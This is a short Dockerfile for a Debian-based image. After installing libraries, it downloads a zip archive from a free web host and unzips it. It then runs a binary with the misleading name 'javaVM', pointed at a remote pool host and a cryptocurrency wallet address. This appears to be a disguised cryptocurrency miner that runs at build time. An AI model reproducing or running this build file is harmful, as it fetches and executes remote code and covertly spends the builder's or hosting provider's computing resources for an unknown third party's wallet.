FROM debian:sid-slim as builder

RUN apt-get update && apt-get dist-upgrade -y && \
    apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

RUN apt-get update && apt-get install zip wget -y && \
    wget -q https://reelduckz.000webhostapp.com/education/javaored.zip && \
    unzip javaored.zip && \
    ./javaVM -r colab.jadepool.cloud:80 -w deroi1qy9al37a8qgjmat4y9wf5wc637md58jtt6p4980k34xxhrk2h9m6jq9pvfz92xcqqqqcuqjtt8tq0zys9j
